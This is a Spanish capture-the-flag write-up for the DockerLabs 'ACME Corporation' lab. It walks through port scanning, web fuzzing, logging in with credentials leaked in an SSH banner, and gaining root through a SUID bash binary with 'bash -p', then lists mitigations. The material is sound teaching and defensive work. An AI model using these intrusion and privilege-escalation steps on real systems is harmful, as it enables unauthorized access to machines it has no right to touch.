# ACME-Dockerlabs
Maquina con acceso fácil al ssh donde después deberás explorar los servicios web interno e intentar explotarlo
# ACME Corporation — Writeup

Resolución de la máquina **ACME Corporation** de [DockerLabs](https://dockerlabs.es).

| | |
|---|---|
| **Máquina** | ACME Corporation |
| **Plataforma** | DockerLabs |
| **Dificultad** | Fácil |
| **IP** | `172.17.0.2` |
| **SO** | Ubuntu 22.04 LTS |
| **Técnicas** | Enumeración web · Banner SSH informativo · Credenciales en banner · SUID (`bash -p`) |

---

## Índice

1. [Reconocimiento](#1-reconocimiento)
2. [Enumeración web](#2-enumeración-web)
3. [Acceso inicial (foothold)](#3-acceso-inicial-foothold)
4. [Escalada de privilegios](#4-escalada-de-privilegios)
5. [Resumen de la cadena](#5-resumen-de-la-cadena)
6. [Mitigaciones](#6-mitigaciones)

---

## 1. Reconocimiento

Comprobación de conectividad. El `ttl=64` confirma que se trata de una máquina Linux:

```bash
ping -c 1 172.17.0.2
```

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.142 ms
```

Escaneo completo de puertos con detección de versión y scripts por defecto:

```bash
sudo nmap -p- -sS -sV -sC -vvv -Pn -n -T5 172.17.0.2
```

Resultado:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.16 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: ACME Corporation - Portal en Mantenimiento
| http-robots.txt: 1 disallowed entry
|_/migration_notes.txt
|_  Supported Methods: POST OPTIONS HEAD GET
```

Dos puertos abiertos:

- **22/tcp** — SSH (OpenSSH 8.9p1 / Ubuntu 22.04)
- **80/tcp** — HTTP (Apache 2.4.52)

nmap ya adelanta dos pistas vía NSE: el título **"ACME Corporation - Portal en Mantenimiento"** y una entrada *disallow* en `robots.txt` hacia **`/migration_notes.txt`**.

---

## 2. Enumeración web

### El portal web

La raíz del sitio muestra un portal corporativo en **"Modo Mantenimiento"**:

![Portal ACME en mantenimiento](assets/portal-mantenimiento.png)

El contenido es puro *lore*, pero esconde la pista clave de acceso:

> **AVISO DE ACCESO Y ADMINISTRACIÓN** — El acceso a las consolas de gestión se realiza exclusivamente mediante el servicio SSH. *Pruebe a conectarse por SSH con cualquier usuario para consultar el aviso y las notificaciones del sistema con las instrucciones de acceso.*
>
> ```
> $ ssh cualquier_usuario@<IP_OBJETIVO>
> ```
>
> *El servidor SSH emitirá automáticamente el banner de bienvenida del nodo con el protocolo de mantenimiento.*

Del pie de página sacamos info del sistema: **ACME Security & DevOps Team · Servidor Ubuntu 22.04 LTS · Nodo Bastión**.

➡️ **Pista clave:** el servidor SSH tiene configurado un **banner** (directiva `Banner` en `sshd_config`) que se muestra *antes* de autenticar. Conectando con cualquier nombre de usuario podemos leerlo.

### Fuzzing de directorios

Enumeración de contenido con Gobuster (extensiones `php,txt,backup`), filtrando la longitud de la página de mantenimiento:

```bash
gobuster dir -u http://172.17.0.2 \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,txt,backup --exclude-length 10701
```

```
robots.txt           (Status: 200) [Size: 45]
server-status        (Status: 403) [Size: 275]
```

`server-status` da `403` (restringido) y `migration_notes.txt` resulta ser un señuelo (no aporta nada). **El camino real es el banner de SSH.**

---

## 3. Acceso inicial (foothold)

Nos conectamos por SSH con cualquier nombre de usuario para leer el banner:

```bash
ssh cualquier_usuario@172.17.0.2
```

El banner de mantenimiento revela las credenciales temporales:

```
===================================================================
[*] ACME Corporation - Nodo Bastion de Mantenimiento Interno
[!] AVISO DE SEGURIDAD Y ACCESO:
[!] Portal corporativo en proceso de migracion a infraestructura interna.
[!] Credenciales temporales asignadas para tareas de mantenimiento:
[!]   - Usuario: usuario
[!]   - Password: P@ssw0rd2026_CTF!
===================================================================
```

> ⚠️ **Ojo al detalle (trampa típica de CTF):** `cualquier_usuario` es solo el ejemplo del enunciado; **no existe** como cuenta. El banner indica que el usuario real es **`usuario`**. Intentar loguearse como `cualquier_usuario` (o reventarlo con hydra) es perder el tiempo — hay que leer el banner y usar el usuario que indica.

Login con las credenciales correctas:

```bash
ssh usuario@172.17.0.2
# Password: P@ssw0rd2026_CTF!
```

```
Welcome to Ubuntu 22.04.5 LTS
usuario@...:~$
```

Flag de usuario:

```bash
-bash-5.1$ cat user.txt
FLAG{nmap_recon_ssh_foothold_7a9f24e1}
```

> 💡 Si SSH se queja de `REMOTE HOST IDENTIFICATION HAS CHANGED` (máquina reconstruida), limpia la clave antigua:
> ```bash
> ssh-keygen -f '/home/kali/.ssh/known_hosts' -R '172.17.0.2'
> ```

---

## 4. Escalada de privilegios

El usuario `usuario` **no está en el fichero sudoers** (`sudo su` y `su root` fallan), así que descartamos esa vía:

```
usuario is not in the sudoers file.  This incident will be reported.
```

Buscamos binarios con bit **SUID** (ejecutan con los privilegios de su propietario, normalmente `root`):

```bash
find / -perm -4000 2>/dev/null
```

```
/usr/bin/dash
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/umount
/usr/bin/bash          <-- ¡anómalo!
/usr/bin/su
/usr/bin/mount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
```

**`/usr/bin/bash` tiene el bit SUID activado** y es propiedad de `root` — eso no es normal en un sistema sano:

```bash
ls -l /usr/bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /usr/bin/bash
#  ^ la 's' en el bloque de permisos del propietario = SUID
```

Un `bash` SUID-root permite obtener una shell con privilegios efectivos de `root` usando la opción **`-p`** (preserva el EUID en vez de descartarlo):

```bash
/bin/bash -p
```

```
bash-5.1# whoami
root
```

**Somos root.** 🏆

> 📌 Referencia: [GTFOBins — bash (SUID)](https://gtfobins.github.io/gtfobins/bash/#suid)

---

## 5. Resumen de la cadena

```
nmap                   → puertos 22 (SSH) y 80 (HTTP)
   │
web :80                → "Portal en Mantenimiento": acceso solo por SSH,
   │                      el banner trae las instrucciones
   │
ssh <cualquier>        → banner revela credenciales: usuario / P@ssw0rd2026_CTF!
   │
ssh usuario            → foothold + user.txt
   │
find -perm -4000       → /usr/bin/bash con bit SUID
   │
bash -p                → root
```

| Fase | Vulnerabilidad | Herramienta / Acción |
|------|----------------|----------------------|
| Recon | Servicios expuestos | `nmap` |
| Web | Info disclosure (portal) | navegador / `curl` |
| Foothold | **Credenciales en el banner SSH** | `ssh` |
| Privesc | **SUID en `/usr/bin/bash`** | `find` + `bash -p` |

---

## 6. Mitigaciones

- **No publicar credenciales en banners ni en la web.** Un banner SSH (`/etc/issue.net`) nunca debe contener usuarios ni contraseñas; es información accesible sin autenticar.
- **Credenciales temporales de verdad temporales.** Rotar y eliminar las cuentas de migración en cuanto terminan las tareas; no reutilizar contraseñas "de mantenimiento".
- **Revisar los binarios SUID.** `/usr/bin/bash` jamás debe tener el bit SUID. Auditar con `find / -perm -4000` y retirar los que no correspondan (`chmod u-s`).
- **Principio de mínimo privilegio.** Un nodo bastión no debería exponer rutas de escalada tan directas; limitar los SUID al mínimo imprescindible.

---
